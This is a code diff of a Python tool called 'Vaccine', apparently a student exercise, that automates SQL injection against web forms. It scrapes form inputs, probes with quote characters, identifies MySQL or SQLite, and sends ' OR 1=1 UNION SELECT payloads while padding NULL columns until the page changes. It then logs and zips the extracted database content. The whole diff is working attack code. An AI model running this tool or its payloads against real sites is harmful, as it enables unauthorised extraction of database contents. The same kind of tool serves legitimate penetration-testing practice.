@@ -2,10 +2,14 @@ import requests
 import argparse
 from bs4 import BeautifulSoup
 import difflib
+import zipfile
+import os
 
-injections_select = {
+injections_error = ["'", '"', '`']
+
+injections_select_union = {
             'mysql': " UNION SELECT table_name",
-            'sqlite': " UNION SELECT name, NULL",
+            'sqlite': " UNION SELECT name",
         }
 
 injections_FROM = {
@@ -22,7 +26,7 @@ class Vaccine:
         self.database_tab = ["mysql", "sqlite"]
         self.form = []
 
-    def inject(self, payload):
+    def inject(self, payload, before):
         for input_test in self.form:
             data = {}
             for input in self.form:
@@ -30,19 +34,13 @@ class Vaccine:
                     data[input] = "no empty input"
                 else:
                     data[input] = payload
-            print(data)
             if self.method.upper() == 'GET':
-                print("GET")
                 response = requests.get(self.url, params=data)
             elif self.method.upper() == 'POST':
-                print("POST")
-                print(data)
-                print(self.url)
-
                 response = requests.post(self.url, data=data)
-                print(response.text)
             if self.database == None:
                 self.database = self.identify_sgbd(response)
+                self.log_result(self.url, payload, input_test, before.text, response.text)
             return response, input_test
             
 
@@ -50,15 +48,16 @@ class Vaccine:
         before = requests.get(self.url)
         self.form = self.scrap_form()
         if self.database == None:
-            self.inject("'")
+            for injection in injections_error:
+                self.inject(injection, before)
 
         nb_null = ""
-        payload = "' OR 1=1" + injections_select[self.database] + nb_null + injections_FROM[self.database]
-        response, input_test = self.inject(payload)
+        payload = "' OR 1=1" + injections_select_union[self.database] + nb_null + injections_FROM[self.database]
+        response, input_test = self.inject(payload, before)
         while self.is_vulnerable(before, response) != True and len(nb_null) < 100:
             nb_null += ",NULL"
-            payload = "' OR 1=1" + injections_select[self.database] + nb_null + injections_FROM[self.database]
-            response, input_test = self.inject(payload)
+            payload = "' OR 1=1" + injections_select_union[self.database] + nb_null + injections_FROM[self.database]
+            response, input_test = self.inject(payload, before)
         if len(nb_null) < 100:
             self.log_result(self.url, payload, input_test, before.text, response.text)
             return True
@@ -78,26 +77,32 @@ class Vaccine:
         return True
 
     def log_result(self, url, payload, input_test, before, after):
-        # print(f"before: {before}")
-        # print(f"after: {after}")
         with open(self.archive, 'a') as file:
             if self.database:
                 file.write(f'Database: {self.database}\n')
             file.write(f'URL: {url}\nPayload: {payload}\nInput: {input_test}\n')
-            soup = BeautifulSoup(after, 'html.parser')
-            pre_tags = soup.find_all('pre')
+            
+            # Convert responses to lists of lines
+            before_lines = before.splitlines()
+            after_lines = after.splitlines()
+            
+            # Compute the differences
+            diff = list(difflib.unified_diff(before_lines, after_lines, lineterm=''))
+            
+            # Write the differences to the file
             file.write('--- Extracted Results ---\n')
-            for pre in pre_tags:
-                text = pre.get_text(separator="\n")
-                file.write(f"{text}\n")
+            for line in diff:
+                if line.startswith('+') and not line.startswith('+++'):
+                    file.write(f"{line}\n")
             
             file.write('--- End of Extracted Results ---\n\n')
 
     def run(self):
         if self.test_injection() == False:
             print("No vulnerabilities found")
-            return
-        print("Vulnerabilities found")
+        else:
+            print("Vulnerabilities found")
+        self.zipper_fichier(self.archive, self.archive + ".zip")
 
     def identify_sgbd(self, after):
         response = requests.get(self.url)
@@ -128,6 +133,11 @@ class Vaccine:
         form = soup.find('form')
         input_names = [input.get('name') for input in form.find_all('input') if input.get('name')]
         return input_names
+    
+    def zipper_fichier(self, fichier_a_zipper, fichier_zippe):
+        with zipfile.ZipFile(fichier_zippe, 'w') as zipf:
+            zipf.write(fichier_a_zipper)
+        os.remove(fichier_a_zipper)
 
 
 if __name__ == "__main__":
